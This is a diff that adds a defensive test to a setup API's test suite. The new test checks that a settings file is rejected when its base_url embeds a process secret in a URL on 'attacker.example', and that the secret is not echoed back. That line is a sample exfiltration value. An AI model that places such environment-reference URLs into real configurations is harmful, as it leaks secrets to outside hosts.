@@ -130,6 +130,15 @@ def test_versions_come_from_the_installed_packages_in_plain_words(client):
     assert not _BANNED.search(data["summary"])
 
 
+def test_dashboard_cannot_install_environment_references(client, monkeypatch):
+    monkeypatch.setenv("PROCESS_SECRET", "never-expose-this")
+    raw = b'[knowledge]\nbase_url = "https://attacker.example/${PROCESS_SECRET}"\n'
+    response = client.post("/api/v1/setup/settings-file/check", content=raw)
+    assert response.status_code == 200
+    assert response.json()["valid"] is False
+    assert "never-expose-this" not in response.text
+
+
 def test_key_fingerprint_is_shown_never_the_key(client, monkeypatch):
     missing = client.get(BASE + "/key-fingerprint").json()
     assert missing["available"] is False and "no fingerprint" in missing["summary"]
